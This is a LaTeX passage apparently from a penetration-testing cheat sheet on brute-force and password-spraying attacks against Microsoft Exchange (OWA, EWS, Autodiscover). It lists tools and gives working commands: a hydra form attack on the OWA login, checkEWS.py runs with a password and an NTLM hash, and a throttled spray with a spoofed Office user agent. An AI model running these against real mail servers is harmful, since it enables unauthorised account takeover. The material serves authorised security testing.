\subsection{Bruteforce/spraying attack}

\subsubsection{OWA}

Windows:
\begin{itemize}
    \item 
        mailsniper
\end{itemize}

Linux:
\begin{itemize}
    \item 
        msf (\verb+auxiliary/scanner/http/owa_login+)
    \item
        msf (\verb+auxiliary/scanner/http/owa_ews_login+)
    \item
        \verb+owabf2.py+
    \item
        \verb+owabrute.sh+
    \item hydra
        \begin{verbatim}
        hydra   -I -t 40           \
                -L "${USERSLIST}"  \
                -e s -u   -f        \
                -P "${PASSLIST}" \
                "${DOMAIN}"       \
                https-post-form "/owa/auth.owa:flags=4&destination=https\://${DOMAIN}/owa/&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:F=The user name or password"
        \end{verbatim}
    \item  
        \href{https://raw.githubusercontent.com/3gstudent/Homework-of-Python/master/checkOWA.py}{checkOWA.py} 
\end{itemize}



\subsubsection{EWS}

linux:
\begin{itemize}
    \item 
        \href{https://raw.githubusercontent.com/3gstudent/Homework-of-Python/master/checkEWS.py}{checkEWS.py}:
    \begin{verbatim}
        python checkEWS.py 10.10.110.254 443 plaintext rlab ahope Summer2023
        checkEWS.py test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1
    \end{verbatim}
    \item
        \href{https://github.com/iomoath/PyExchangePasswordSpray}{exchange\_password\_spray.py}:
        \begin{verbatim}
        python3 exchange_password_spray.py -U userlist.txt -P password.txt \
            --url https://webmail.example.org/EWS/Exchange.asmx \
            --delay 62 -T 1 \
            -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" \
            -O result.txt -v
        \end{verbatim}
        
\end{itemize}


\subsubsection{Autodiscover}
ruler



